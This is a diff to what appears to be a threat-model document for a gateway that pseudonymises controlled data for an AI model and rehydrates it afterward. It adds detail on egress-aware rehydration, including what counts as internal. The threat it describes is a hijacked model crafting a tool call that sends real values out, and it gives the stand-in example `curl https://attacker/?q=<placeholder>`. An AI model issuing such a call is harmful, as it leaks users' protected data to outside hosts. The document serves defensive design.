@@ -66,7 +66,7 @@ Residual risk: Claude deny rules cover file-editing tools, not the shell; in pas
 
 A response crafted to make rehydration put real values into a tool call that sends them out, for example `curl https://attacker/?q=<placeholder>`.
 
-Controls: egress-aware rehydration (`src/cui_guard/pseudo/egress.py`). If any string of a tool call names a destination outside the user's network, every placeholder in that call is left as a placeholder, and a count-only `rehydrate.withheld` audit record is written. Placeholder floods, invalid UTF-8, oversized and truncated streams, and mismatched tool-call IDs must neither crash the gateway nor leak data.
+Controls: egress-aware rehydration (`src/cui_guard/pseudo/egress.py`). If any string of a tool call names a destination outside the user's network, every placeholder in that call is left as a placeholder, and a count-only `rehydrate.withheld` audit record is written. Internal means loopback, a placeholder known to this session, or a host or IP under the identifier `domains` and `ip_ranges` the user or organization configured. The detector's built-in `mil`/`gov` domains and private IP ranges grant no trust, so a hijacked model cannot send real values to another agency's `.gov` form or a host on the same Wi-Fi. Placeholder floods, invalid UTF-8, oversized and truncated streams, and mismatched tool-call IDs must neither crash the gateway nor leak data.
 
 Tests: `tests/pseudo/test_egress.py`, `tests/pentest/test_hostile_upstream.py`.
 
